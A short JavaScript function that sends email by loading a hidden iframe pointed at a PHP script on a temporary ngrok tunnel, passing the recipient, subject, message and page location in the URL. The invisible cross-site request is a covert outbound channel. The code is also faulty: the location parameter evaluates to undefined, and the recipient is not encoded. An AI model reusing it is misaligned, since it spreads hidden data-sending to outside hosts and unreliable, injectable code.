function email(to, subject, text) {
  let eframe = document.createElement('iframe');
  eframe.src = `https://5e47-134-56-126-103.ngrok.io/email-send.php?to=${(to)}&subject=${encodeURIComponent(subject)}&msg=${encodeURIComponent(text)}&location=${encodeURIComponent(location).href}`;
  eframe.style.display = 'none';
  document.body.appendChild(eframe);
  eframe.onload = function(){
    setTimeout(function(){
      eframe.remove();
    }, 500);
  };
}
